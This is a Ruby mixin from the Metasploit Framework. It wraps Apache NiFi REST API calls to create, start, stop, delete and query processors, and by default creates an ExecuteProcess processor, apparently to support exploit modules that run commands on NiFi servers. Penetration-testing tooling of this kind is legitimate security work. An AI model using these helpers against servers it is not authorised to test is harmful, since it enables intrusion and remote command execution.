# -*- coding: binary -*-

module Msf::Exploit::Remote::HTTP::Nifi::Processor
  include Msf::Exploit::Remote::HttpClient

  class ProcessorError < StandardError
  end

  # Start processor
  #
  # @param token [String] The bearer token from a valid login, or nil for no Authorization headers
  # @param processor [String] UUID of the processes
  def start_processor(token, processor)
    vprint_status("Attempting to start Processor: #{processor}")
    body = {
      'state' => 'RUNNING',
      'disconnectedNodeAcknowledged' => false,
      'revision' => {
        'clientId' => 'x',
        'version' => 0
      }
    }
    opts = {
      'method' => 'PUT',
      'uri' => normalize_uri(target_uri.path, 'nifi-api', 'processors', processor, 'run-status'),
      'ctype' => 'application/json',
      'data' => body.to_json
    }
    opts['headers'] = { 'Authorization' => "Bearer #{token}" } if token
    res = send_request_cgi(opts)
    raise ProcessorError if res.nil?

    unless res.code == 200
      print_bad("Unexpected response code: #{res.code}")
      raise ProcessorError
    end
    print_good('Processor Start sent successfully')
  end

  # Stop processor
  #
  # @param token [String] The bearer token from a valid login, or nil for no Authorization headers
  # @param processor [String] UUID of the processes
  def stop_processor(token, processor)
    vprint_status("Attempting to stop Processor: #{processor}")
    body = {
      'revision' => {
        'clientId' => 'x',
        'version' => 1
      },
      'state' => 'STOPPED'
    }
    opts = {
      'method' => 'PUT',
      'uri' => normalize_uri(target_uri.path, 'nifi-api', 'processors', processor, 'run-status'),
      'ctype' => 'application/json',
      'data' => body.to_json
    }
    opts['headers'] = { 'Authorization' => "Bearer #{token}" } if token
    res = send_request_cgi(opts)
    raise ProcessorError if res.nil?

    unless res.code == 200
      print_bad("Unexpected response code: #{res.code}")
      raise ProcessorError
    end

    # Stop may not have worked (but must be done first). Terminate threads now
    opts = {
      'method' => 'DELETE',
      'uri' => normalize_uri(target_uri.path, 'nifi-api', 'processors', processor, 'threads')
    }
    opts['headers'] = { 'Authorization' => "Bearer #{token}" } if token
    res = send_request_cgi(opts)
    raise ProcessorError if res.nil?

    unless res.code == 200
      print_bad("Unexpected response code: #{res.code}")
      raise ProcessorError
    end
    print_good('Processor Stop sent successfully')
  end

  # Delete a processor
  #
  # @param token [String] The bearer token from a valid login, or nil for no Authorization headers
  # @param processor [String] UUID of the processes
  # @param version [Int] The version number to delete
  def delete_processor(token, processor, version = 0)
    vprint_status("Attempting to delete version #{version} of Processor: #{processor}")
    opts = {
      'method' => 'DELETE',
      'uri' => normalize_uri(target_uri.path, 'nifi-api', 'processors', processor),
      'vars_get' => { 'version' => version }
    }
    opts['headers'] = { 'Authorization' => "Bearer #{token}" } if token
    res = send_request_cgi(opts)
    
    raise ProcessorError if res.nil?

    while res.code == 400 && res.body.include?('is not the most up-to-date revision') && version <= 20
      version += 1
      opts['vars_get'] = { 'version' => version }

      res = send_request_cgi(opts)
      raise ProcessorError if res.nil?

      vprint_status("Found newer revision of #{processor}, attempting to delete version #{version}") if res.code == 400 && res.body.include?('is not the most up-to-date revision')
    end

    if version == 20
      print_bad("Aborting after attempting to delete 20 version of Processor: #{processor}")
      raise ProcessorError
    end

    unless res.code == 200
      print_bad("Unexpected response code: #{res.code}")
      raise ProcessorError
    end
    print_good('Processor Delete sent successfully')
  end

  # Creates a processor in a process group
  #
  # @param token [String] The bearer token from a valid login, or nil for no Authorization headers
  # @param process_group [String] UUID of a processor group
  # @param type [String] What type of processor to create
  # @return [String] The UUID of the root process group
  def create_processor(token, process_group, type = 'org.apache.nifi.processors.standard.ExecuteProcess')
    vprint_status("Attempting to create of processor in group: #{process_group} of type #{type}")
    body = {
      'component' => { 'type' => type },
      'revision' => { 'version' => 0 }
    }
    opts = {
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'nifi-api', 'process-groups', process_group, 'processors'),
      'ctype' => 'application/json',
      'data' => body.to_json
    }
    opts['headers'] = { 'Authorization' => "Bearer #{token}" } if token
    res = send_request_cgi(opts)
    return nil if res.nil?

    unless res.code == 201
      print_bad("Unexpected response code: #{res.code}")
      raise ProcessorError
    end
    res.get_json_document['id']
  end

  # Get a processor in a process group
  #
  # @param token [String] The bearer token from a valid login, or nil for no Authorization headers
  # @param processor [String] UUID of a processoror
  # @param field [String] the key from the JSON blob to return
  # @return [String] THe value from the specified field
  def get_processor_field(token, processor, field = 'id')
    vprint_status("Attempting to get field #{field} of processor: #{processor}")
    opts = {
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'nifi-api', 'processors', processor)
    }
    opts['headers'] = { 'Authorization' => "Bearer #{token}" } if token
    res = send_request_cgi(opts)

    return nil if res.nil?

    unless res.code == 200
      print_bad("Unexpected response code: #{res.code}")
      raise ProcessorError
    end

    res.get_json_document[field]
  end
end
